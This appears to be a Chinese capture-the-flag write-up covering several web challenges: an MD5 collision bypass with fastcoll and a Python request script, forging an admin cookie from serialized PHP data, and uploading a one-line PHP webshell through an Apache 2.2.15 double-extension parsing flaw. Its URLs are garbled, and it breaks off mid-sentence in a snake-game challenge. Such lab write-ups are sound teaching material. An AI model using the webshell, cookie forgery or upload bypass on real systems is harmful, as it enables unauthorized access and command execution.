
### md5 crash

> `348K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6j5`

右击查看源代码

```
MD5 cracking<!-- if((string)$_POST['data1']!==(string)$_POST['data2']&&md5($_POST['data1'])===md5($_POST['data2']))-->fail
```

发现进行了类型转换，并且是强类型比较，可以使用md5碰撞生成器，生成两个内容不同，但是md5相同的文件，来进行攻击。

使用`fastcoll`工具来进行md5碰撞攻击：

```
fastcoll_v1.0.0.5.exe -p .\a.bin -o a1.bin a2.bin
```

用`python`来进行读取然后进行url编码：

```
#coding=utf-8

import urllib.parse

import requests

f1 = open("a1.bin","rb").read()

f2 = open("a2.bin","rb").read()

data = {

    'data1':f1,

    'data2':f2,

    }

flag = requests.post("ce7K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6j5`.",data=data).text

print(flag)
```

![1569590806621](https://bbs.kanxue.com/upload/attach/202004/873556_RPRS7U95HQA4R2S.jpg)

### 简单的md5

> `1acK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3o6b7`

访问后右击查看源代码

```
easy MD5 cracking <!--$_POST['data1']!=$_POST['data2']-->fail
```

直接传参

![1569589959820](https://bbs.kanxue.com/upload/attach/202004/873556_TFCS68RCT76DMSU.jpg)

### 秘密的系统

> 不久前才开发的系统，功能也还不完善，代码也还有待改进 `652K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1j5`

访问`53aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1k6%4k6h3u0Q4x3V1k6J5L8$3u0G2N6s2y4Q4x3X3g2@1P5s2b7`发现

```
User-agent: *
Disallow: index.php?r=site/loginuser_1
```

访问`840K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0c8Q4x3V1k6%4k6h3u0Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9K6c8Y4u0Q4x3@1c8K6K9i4c8W2i4K6u0r3L8r3!0Y4K9h3&6#2M7$3g2J5i4K6g2X3x3b7`，右击查看源代码

```
<!--

*** author: cib_zhinianyuxin.com

*** code: github.com

-->
```

给出了github的地址，通过它找到了作者留在github上的hint

```
It's just a system which is not completed , there are some tips:

you can use test/cib_sec to login ,but you are not admin!

only admin can upload file ,but whichone can not bypass my rules.

/**

$sign = array(

                    'id'=>$model->id,

                    'name'=>$model->username,

                    'sign'=>md5($model->id.$model->username),

                );

$_COOKIE['Cib_security'] = serialize($sign);

**/
```

获得了一个测试账号`test/cib_sec`和cookie生成的php代码

```
$sign = array(

                    'id'=>$model->id,

                    'name'=>$model->username,

                    'sign'=>md5($model->id.$model->username),

                );

$_COOKIE['Cib_security'] = serialize($sign);
```

我们用测试账号登陆

发现权限是游客，`upload`功能无法使用

![1569586043107](https://bbs.kanxue.com/upload/attach/202004/873556_2J8DQ4DABBURY2P.jpg)

我们来分析`test`用户的cookie，对其进行`urldecode`和反序列化操作

```
Array{

  [id]=>2

  [name]=>test

  [sign]=>7cbab5cea99169139e7e6d8ff74ebb77

}
```

根据github上的生成信息来伪造管理员的cookie

```
<?php

$signAdmin = array(

    "id"=>1,

    "name"=>'admin',

    "sign"=>'6c5de1b510e8bdd0bc40eff99dcd03f8'

);

$cib_sec = urlencode(serialize($signAdmin));

echo $cib_sec;

?>
```

获得cookie

```
a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%226c5de1b510e8bdd0bc40eff99dcd03f8%22%3B%7D
```

通过burpsuite替换cookie访问`upload`页面

![1569586575730](https://bbs.kanxue.com/Writeup.assets/1569586575730.png)

成功访问`upload`页面

![1569586616551](https://bbs.kanxue.com/upload/attach/202004/873556_M6NASW4453D76ZG.jpg)

我们利用上传点来上传我们的webshell

```
<?php system($_POST['cmd']); ?>
```

上传点存在白名单验证，从返回包可以得知其是apache2.2.15，apache2.2.15版本具有文件解析漏洞，可以把`test.php.png`当作php文件来解析执行，apache高版本不存在此漏洞，这里我们可以使用apache2.2.15的解析漏洞来绕过白名单限制。

![1569586798936](https://bbs.kanxue.com/upload/attach/202004/873556_FJHW49BSVV8RSC7.jpg)

成功上传，访问得到flag

![1569586832636](https://bbs.kanxue.com/upload/attach/202004/873556_K2BV934ZAEHUW93.jpg)

### game

> 玩个蛇皮 `893K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0p5`

这个题是一个用js实现的贪吃蛇游戏

![1569586981298](https://bbs.kanxue.com/upload/attach/202004/873556_U4NPDPXR4P9M4F5.jpg)

玩一局就可以看到它的长度显示了出来，右击查看源代码

```
<!DOCTYPE html> 
<html>
<head>
    <title>Game</title>
    <link rel="stylesheet" type="text/css" href="./css/game.css" />
</head>
<body>
    <div id="game-area" tabindex="0">
    </div>
    <script type="text/javascript" src="./js/game.js"></script>
    <script type="text/javascript">
    var mySnakeBoard = new SNAKE.Board(  {
                                            boardContainer: "game-area",
                                            fullScreen: true
                                        });    
    </script>
</body>
</html>
```

可以看到这里加载了`game.js`文件，我们访问`176K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5I4y4q4)9J5k6e0f1#2i4K6u0W2x3K6k6Q4x3X3f1$3z5g2)9K6b7e0R3H3x3e0q4Q4x3V1k6B7M7#2)9J5c8X3N6S2L8h3g2Q4x3X3g2B7M7H3`.
